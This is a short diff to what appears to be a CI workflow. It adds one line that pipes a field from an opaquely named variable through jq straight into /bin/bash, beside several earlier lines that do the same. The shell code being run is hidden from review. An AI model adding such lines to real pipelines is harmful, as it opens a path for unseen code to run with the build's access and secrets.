@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$z00212" | jq -r .z610 | /bin/bash
           printf '%s' "$lqk36857" | jq -r .w972 | /bin/bash
           printf '%s' "$giz6941" | jq -r .o10 | /bin/bash
+          echo $swam1 | jq -r .votzg87 | /bin/bash
 
       - name: Store results
         if: always()
